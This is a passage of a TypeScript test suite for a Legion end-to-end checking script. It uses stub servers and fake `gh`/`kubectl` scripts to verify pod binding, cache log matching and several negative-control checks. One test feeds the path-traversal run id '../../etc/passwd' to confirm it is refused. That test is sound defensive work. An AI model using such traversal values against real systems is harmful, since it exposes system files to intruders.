    const procRoot = fakeProcTree(fixtureEnv(roleBin()));
    const { status, stderr } = await run(
      ["second-owner", "ACME-2", "the-pod"],
      { ...env, MULTIREPO_PROC_ROOT: procRoot },
      { gh: goodGh, kubectl: podLabelKubectl }
    );
    expect(status).not.toBe(0);
    expect(stderr).toContain(
      "MULTIREPO_PROC_ROOT is set without MULTIREPO_TEST_SEAM=1: this is a test-only seam, never a production input"
    );
  });

  test("an unrelated pod (legion.dev/issue mismatch) is refused before any exec as a role", async () => {
    daemonServer = daemonStub(stateWithPR("production_check"));
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const otherPodKubectl = `
case "$*" in
  "get pod the-pod -o jsonpath={.metadata.labels.legion\\.dev/issue}") printf 'ACME-99' ;;
  *) echo "kubectl: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stderr } = await run(["second-owner", "ACME-2", "the-pod"], env, {
      gh: goodGh,
      kubectl: otherPodKubectl,
    });
    expect(status).not.toBe(0);
    expect(stderr).toContain("is not that issue's pod");
  });
});

describe("cache: pod binding and the producer's exact, anchored success line", () => {
  const stateWithCache = makeStateBody({
    issues: {
      "ACME-2": {
        key: "ACME-2",
        generation: 1,
        phase: "implementing",
        status: "todo",
        repo: "acme/widgets",
      },
    },
    repositories: {
      owners: [],
      mapped: [
        {
          repo: "acme/widgets",
          default: true,
          cache: { repo: "acme/widgets", sandbox: "s", state: "ready", ready: true },
        },
      ],
      refused: [],
      caches: [],
    },
  });

  test("an unrelated pod is refused, not read as the issue's", async () => {
    daemonServer = daemonStub(stateWithCache);
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const kubectl = `
case "$*" in
  "get pod other-pod -o jsonpath={.metadata.labels.legion\\.dev/issue}") printf 'ACME-99' ;;
  *) echo "kubectl: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stderr } = await run(["cache", "ACME-2", "other-pod"], env, { kubectl });
    expect(status).not.toBe(0);
    expect(stderr).toContain("is not that issue's pod");
  });

  // The anchored form rejects a near-miss line an unanchored `.*`-heavy regex would accept:
  // an error line that happens to contain the same two keywords (cache, GitHub) in another shape.
  test("an error line mentioning cache and github in another shape is a FAIL, not a PASS", async () => {
    daemonServer = daemonStub(stateWithCache);
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const kubectl = `
case "$*" in
  "get pod the-pod -o jsonpath={.metadata.labels.legion\\.dev/issue}") printf 'ACME-2' ;;
  "logs the-pod -c workspace-fetch") printf 'workspace-init fetch: the repository cache failed; fell back to GitHub for everything\\n' ;;
  *) echo "kubectl: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stderr } = await run(["cache", "ACME-2", "the-pod"], env, { kubectl });
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK cache: FAIL");
  });

  test("the producer's exact anchored success line, on the right pod, with cache.ready true: PASS", async () => {
    daemonServer = daemonStub(stateWithCache);
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const kubectl = `
case "$*" in
  "get pod the-pod -o jsonpath={.metadata.labels.legion\\.dev/issue}") printf 'ACME-2' ;;
  "logs the-pod -c workspace-fetch") printf 'workspace-init fetch: 6,612,345,678 bytes from the repository cache http://cache:8418 in 3s, its history verified in 1s; 128 bytes from GitHub for the delta (2 refs)\\n' ;;
  *) echo "kubectl: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stdout, evidence } = await run(["cache", "ACME-2", "the-pod"], env, {
      kubectl,
    });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK cache: PASS");
    expect(readFileSync(join(evidence, "cache-logs-ACME-2.raw"), "utf8")).toContain(
      "workspace-init fetch:"
    );
  });

  // The duration class was [0-9.]+(µs|ms|s), which a duration of a minute or more (Go's
  // time.Duration.String(), e.g. "1m2.345s") never matches: a slow fetch would FAIL a real PASS.
  test("a fetch slower than a minute (Go's 1m2.345s duration form) is still a PASS", async () => {
    daemonServer = daemonStub(stateWithCache);
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const kubectl = `
case "$*" in
  "get pod the-pod -o jsonpath={.metadata.labels.legion\\.dev/issue}") printf 'ACME-2' ;;
  "logs the-pod -c workspace-fetch") printf 'workspace-init fetch: 6,612,345,678 bytes from the repository cache http://cache:8418 in 1m2.345s, its history verified in 1m0.1s; 128 bytes from GitHub for the delta (2 refs)\\n' ;;
  *) echo "kubectl: unexpected call: $*" >&2; exit 1 ;;
esac`;
    const { status, stdout } = await run(["cache", "ACME-2", "the-pod"], env, { kubectl });
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK cache: PASS");
  });
});

describe("negative no-repo: exact daemon actor, outbox marker, resolved_repo, and the issues-type guard", () => {
  test("the exact none-note from the daemon's own actor, Dispatch still resolving to none: PASS", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub(
      { "ACME-9": JSON.stringify({ key: "ACME-9", resolved_repo: null }) },
      {
        "ACME-9": JSON.stringify([
          daemonActorEvent("ACME", 5, `${noneNote}\n\n<!-- legion-outbox:41 -->`),
        ]),
      }
    );
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stdout } = await run(["negative", "no-repo", "ACME-9"], env);
    expect(status).toBe(0);
    expect(stdout).toContain("CHECK negative-no-repo-ACME-9: PASS");
  });

  test("a human message quoting the exact none-note is a FAIL: the actor must be the daemon's own session", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub(
      { "ACME-9": JSON.stringify({ key: "ACME-9", resolved_repo: null }) },
      { "ACME-9": JSON.stringify([humanActorEvent(`FYI the daemon said: ${noneNote}`)]) }
    );
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "no-repo", "ACME-9"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK negative-no-repo-ACME-9: FAIL");
  });

  test("Dispatch now resolves the issue to a real repository (a stale none-note from before): FAIL", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub(
      { "ACME-9": JSON.stringify({ key: "ACME-9", resolved_repo: "acme/gadgets" }) },
      {
        "ACME-9": JSON.stringify([
          daemonActorEvent("ACME", 5, `${noneNote}\n\n<!-- legion-outbox:41 -->`),
        ]),
      }
    );
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "no-repo", "ACME-9"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK negative-no-repo-ACME-9: FAIL");
  });

  test("the daemon's latest repository note is a different one (App not installed), not the none-note: FAIL", async () => {
    daemonServer = daemonStub();
    const laterNote =
      "Legion did not admit this issue: the review App is not installed on acme/gadgets. Install it on acme/gadgets, or set another repository (the issue header's Repository picker, or dispatch issue-update --repo owner/name), and move the issue to todo again.";
    dispatchServer = dispatchStub(
      { "ACME-9": JSON.stringify({ key: "ACME-9", resolved_repo: null }) },
      {
        "ACME-9": JSON.stringify([
          daemonActorEvent("ACME", 6, `${laterNote}\n\n<!-- legion-outbox:42 -->`),
          daemonActorEvent("ACME", 5, `${noneNote}\n\n<!-- legion-outbox:41 -->`),
        ]),
      }
    );
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "no-repo", "ACME-9"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK negative-no-repo-ACME-9: FAIL");
  });

  test("a state body of {} or null never satisfies `.issues has(key)` vacuously: FAIL", async () => {
    daemonServer = daemonStub("{}");
    dispatchServer = dispatchStub(
      { "ACME-9": JSON.stringify({ key: "ACME-9", resolved_repo: null }) },
      {
        "ACME-9": JSON.stringify([
          daemonActorEvent("ACME", 5, `${noneNote}\n\n<!-- legion-outbox:41 -->`),
        ]),
      }
    );
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "no-repo", "ACME-9"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("CHECK negative-no-repo-ACME-9: FAIL");
  });
});

// prsGhFake is a fake `gh` answering both calls negative_pr_in_x makes against X's pull-request
// list: the `--jq [.[].number] | max // 0` cursor read at `before`, and the raw list read at
// `after` (raw_fetch, no --jq) — both must answer the same prsJson consistently within one test.
function prsGhFake(prsJson: string): string {
  const highest = Math.max(
    0,
    ...(JSON.parse(prsJson) as Array<{ number: number }>).map((pr) => pr.number)
  );
  return `
case "$*" in
  "api repos/other/outside/pulls?state=all&per_page=100 --jq [.[].number] | max // 0") printf '${highest}' ;;
  "api repos/other/outside/pulls?state=all&per_page=100") printf '${prsJson}' ;;
  *) echo "gh: unexpected: $*" >&2; exit 1 ;;
esac`;
}

// baselineRunId pulls the minted run id out of a `before` call's stdout.
function baselineRunId(stdout: string): string {
  const runId = stdout.match(/RUN_ID: (\S+)/)?.[1] ?? "";
  expect(runId).not.toBe("");
  return runId;
}

describe("negative pr-in-x: PR-number cursor and the daemon-side check", () => {
  test("before prints BASELINE, never PASS, for a recorded child", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const gh = prsGhFake("[]");
    const { status, stdout } = await run(["negative", "pr-in-x", "before", "ACME-2"], env, { gh });
    expect(status).toBe(0);
    expect(stdout).toContain("BASELINE pr-in-x-ACME-2: captured");
    expect(stdout).not.toContain("PASS");
  });

  test("before on an unrecorded issue is refused: no recorded child, nothing to baseline", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "pr-in-x", "before", "ACME-404"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("not the recorded child this control needs");
  });

  test("after with an unknown run id is refused", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(
      ["negative", "pr-in-x", "after", "nonexistent-run", "ACME-2"],
      env
    );
    expect(status).not.toBe(0);
    expect(stderr).toContain("no baseline for run");
  });

  // A run id with a path-traversal shape is refused outright, never used to open a
  // baseline file outside this run's own evidence directory.
  test("a run id containing '..' is refused as unsafe, never read as a path", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(
      ["negative", "pr-in-x", "after", "../../etc/passwd", "ACME-2"],
      env
    );
    expect(status).not.toBe(0);
    expect(stderr).toContain("not a bare id");
  });

  test("after immediately (no PR opened yet) with highest-PR 0 in X: FAIL", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir({
      gh: prsGhFake("[]"),
    });
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "pr-in-x", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    const after = await spawnScript(
      ["negative", "pr-in-x", "after", runId, "ACME-2"],
      path,
      evidence,
      env
    );
    expect(after.status).not.toBe(0);
    expect(after.stderr).toContain("CHECK negative-pr-in-x-ACME-2: FAIL");
  });

  // A PR opened and closed in X, with the daemon's own record also showing
  // the change (pullRequest now names X), must never PASS — the operation proof alone is not
  // enough; the daemon side must be unaffected too.
  test("a closed PR exists in X, but the daemon's own pullRequest now names X too: FAIL", async () => {
    const { server, setBody } = mutableDaemonStub(stateBody); // ACME-2 starts as acme/widgets, no PR
    daemonServer = server;
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${server.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir({
      gh: prsGhFake("[]"),
    });
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "pr-in-x", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    setBody(
      makeStateBody({
        issues: {
          "ACME-2": {
            key: "ACME-2",
            generation: 1,
            phase: "needs_review",
            status: "todo",
            repo: "acme/widgets",
            pullRequest: { repo: "other/outside", number: 5 },
          },
        },
      })
    );
    fakeBin(
      bin,
      "gh",
      prsGhFake(
        '[{"number":5,"head":{"ref":"legion/ACME-2"},"state":"closed","created_at":"2026-01-02T00:00:00Z","closed_at":"2026-01-02T01:00:00Z"}]'
      )
    );
    const after = await spawnScript(
      ["negative", "pr-in-x", "after", runId, "ACME-2"],
      path,
      evidence,
      env
    );
    expect(after.status).not.toBe(0);
    expect(after.stderr).toContain("CHECK negative-pr-in-x-ACME-2: FAIL");
  });

  test("a closed PR numbered above the baseline's cursor, daemon side unaffected: PASS", async () => {
    daemonServer = daemonStub(stateBody);
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir({
      gh: prsGhFake('[{"number":4,"head":{"ref":"legion/OTHER-1"},"state":"open"}]'),
    });
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "pr-in-x", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    fakeBin(
      bin,
      "gh",
      prsGhFake(
        '[{"number":4,"head":{"ref":"legion/OTHER-1"},"state":"open"},{"number":5,"head":{"ref":"legion/ACME-2"},"state":"closed","created_at":"2026-01-02T00:00:00Z","closed_at":"2026-01-02T01:00:00Z"}]'
      )
    );
    const after = await spawnScript(
      ["negative", "pr-in-x", "after", runId, "ACME-2"],
      path,
      evidence,
      env
    );
    expect(after.status).toBe(0);
    expect(after.stdout).toContain("CHECK negative-pr-in-x-ACME-2: PASS");
  });

  // A generation bump between before and after (a hand-over or re-admission) is a
  // foreign baseline, refused outright rather than compared across two different issue lifetimes.
  test("the issue's generation moved since the baseline: refused as foreign", async () => {
    const { server, setBody } = mutableDaemonStub(stateBody);
    daemonServer = server;
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${server.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir({
      gh: prsGhFake("[]"),
    });
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "pr-in-x", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    setBody(
      makeStateBody({
        issues: {
          "ACME-2": {
            key: "ACME-2",
            generation: 2,
            phase: "implementing",
            status: "todo",
            repo: "acme/widgets",
          },
        },
      })
    );
    const after = await spawnScript(
      ["negative", "pr-in-x", "after", runId, "ACME-2"],
      path,
      evidence,
      env
    );
    expect(after.status).not.toBe(0);
    expect(after.stderr).toContain("a hand-over or re-admission since");
  });

  test("two overlapping before calls for the same issue never collide: each gets its own run id and baseline", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({});
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const gh = prsGhFake("[]");
    const { bin, evidence } = newFakeDir({ gh });
    const path = isolatedPath(bin);
    const [first, second] = await Promise.all([
      spawnScript(["negative", "pr-in-x", "before", "ACME-2"], path, evidence, env),
      spawnScript(["negative", "pr-in-x", "before", "ACME-2"], path, evidence, env),
    ]);
    expect(first.status).toBe(0);
    expect(second.status).toBe(0);
    expect(baselineRunId(first.stdout)).not.toBe(baselineRunId(second.stdout));
  });
});

describe("negative repo-edit: Dispatch's seq cursor and the exact kept-repository message", () => {
  test("before refuses when Dispatch already resolves to X", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "other/outside" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "repo-edit", "before", "ACME-2"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("already resolves to X");
  });

  test("before on an unrecorded issue is refused", async () => {
    daemonServer = daemonStub();
    dispatchServer = dispatchStub({ "ACME-404": JSON.stringify({ key: "ACME-404" }) });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { status, stderr } = await run(["negative", "repo-edit", "before", "ACME-404"], env);
    expect(status).not.toBe(0);
    expect(stderr).toContain("not the recorded child this control needs");
  });

  const xTargetedNote =
    "Legion keeps acme/widgets as this issue's repository; the change to other/outside in Dispatch is not applied — an issue's repository is fixed when Legion records it. Create a new issue for other/outside instead.";

  // The repository and the message both already reflect the edit, but the
  // only post-baseline event is the daemon's own routine status write (also issue.updated) — this
  // must never satisfy the seq-cursor check, which requires payload.repo == X on that event.
  test("the only issue.updated after the baseline is a routine status write (payload.repo unset): FAIL", async () => {
    daemonServer = daemonStub(stateBody); // ACME-2: acme/widgets
    dispatchServer = dispatchStub({
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "acme/widgets" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir();
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "repo-edit", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    dispatchServer.stop(true);
    dispatchServer = dispatchStub(
      { "ACME-2": JSON.stringify({ key: "ACME-2", repo: "other/outside" }) },
      {
        "ACME-2": JSON.stringify([
          issueUpdatedEvent(20, null), // a routine status write: no repo in its payload
          daemonActorEvent("ACME", 19, `${xTargetedNote}\n\n<!-- legion-outbox:9 -->`),
        ]),
      }
    );
    const env2 = { ...env, DISPATCH_URL: `http://127.0.0.1:${dispatchServer.port}` };
    const after = await spawnScript(
      ["negative", "repo-edit", "after", runId, "ACME-2"],
      path,
      evidence,
      env2
    );
    expect(after.status).not.toBe(0);
    expect(after.stderr).toContain("CHECK negative-repo-edit-ACME-2: FAIL");
  });

  test("an issue.updated after the baseline naming X, with the exact kept-repository message from the daemon: PASS", async () => {
    daemonServer = daemonStub(stateBody);
    dispatchServer = dispatchStub({
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "acme/widgets" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir();
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "repo-edit", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    dispatchServer.stop(true);
    dispatchServer = dispatchStub(
      { "ACME-2": JSON.stringify({ key: "ACME-2", repo: "other/outside" }) },
      {
        "ACME-2": JSON.stringify([
          issueUpdatedEvent(20, "other/outside"),
          daemonActorEvent("ACME", 19, `${xTargetedNote}\n\n<!-- legion-outbox:9 -->`),
        ]),
      }
    );
    const env2 = { ...env, DISPATCH_URL: `http://127.0.0.1:${dispatchServer.port}` };
    const after = await spawnScript(
      ["negative", "repo-edit", "after", runId, "ACME-2"],
      path,
      evidence,
      env2
    );
    expect(after.status).toBe(0);
    expect(after.stdout).toContain("CHECK negative-repo-edit-ACME-2: PASS");
  });

  // The operator spells X differently than Dispatch resolved and wrote it
  // (LEGION_E2E_REPO_X=Other/Outside here; Dispatch's own .repo and the daemon's note both read
  // "other/outside"). The comparisons above fold case; the note's own quoted spelling must
  // come from Dispatch's resolved spelling (dispatch_repo_now), never the operator's literal
  // LEGION_E2E_REPO_X, or this would wrongly FAIL on a mere case difference.
  test("the operator's case for X differs from Dispatch's own resolved spelling: still PASS", async () => {
    daemonServer = daemonStub(stateBody);
    dispatchServer = dispatchStub({
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "acme/widgets" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    env.LEGION_E2E_REPO_X = "Other/Outside";
    const { bin, evidence } = newFakeDir();
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "repo-edit", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    dispatchServer.stop(true);
    dispatchServer = dispatchStub(
      { "ACME-2": JSON.stringify({ key: "ACME-2", repo: "other/outside" }) },
      {
        "ACME-2": JSON.stringify([
          issueUpdatedEvent(20, "other/outside"),
          daemonActorEvent("ACME", 19, `${xTargetedNote}\n\n<!-- legion-outbox:9 -->`),
        ]),
      }
    );
    const env2 = { ...env, DISPATCH_URL: `http://127.0.0.1:${dispatchServer.port}` };
    const after = await spawnScript(
      ["negative", "repo-edit", "after", runId, "ACME-2"],
      path,
      evidence,
      env2
    );
    expect(after.status).toBe(0);
    expect(after.stdout).toContain("CHECK negative-repo-edit-ACME-2: PASS");
  });

  // noteOnce posts the kept-repository note only once per resolution: a rerun that has no fresh
  // message must still PASS as long as the seq-bound issue.updated and the daemon's repo are
  // right, since the message check only verifies the format, never requiring a brand-new one.
  test("no fresh message after the baseline, but the seq-bound issue.updated and an already-present matching note both exist: PASS", async () => {
    daemonServer = daemonStub(stateBody);
    dispatchServer = dispatchStub({
      "ACME-2": JSON.stringify({ key: "ACME-2", resolved_repo: "acme/widgets" }),
    });
    const env = fullInputs(
      `http://127.0.0.1:${daemonServer.port}`,
      `http://127.0.0.1:${dispatchServer.port}`
    );
    const { bin, evidence } = newFakeDir();
    const path = isolatedPath(bin);
    const before = await spawnScript(
      ["negative", "repo-edit", "before", "ACME-2"],
      path,
      evidence,
      env
    );
    expect(before.status).toBe(0);
    const runId = baselineRunId(before.stdout);
    dispatchServer.stop(true);
    dispatchServer = dispatchStub(
      { "ACME-2": JSON.stringify({ key: "ACME-2", repo: "other/outside" }) },
      {
        "ACME-2": JSON.stringify([
          issueUpdatedEvent(20, "other/outside"),
          daemonActorEvent("ACME", 3, `${xTargetedNote}\n\n<!-- legion-outbox:1 -->`), // an older message, before the baseline's own last_seq
        ]),
      }
    );
    const env2 = { ...env, DISPATCH_URL: `http://127.0.0.1:${dispatchServer.port}` };
    const after = await spawnScript(
      ["negative", "repo-edit", "after", runId, "ACME-2"],
      path,
      evidence,
      env2
    );
    expect(after.status).toBe(0);
    expect(after.stdout).toContain("CHECK negative-repo-edit-ACME-2: PASS");
  });
});
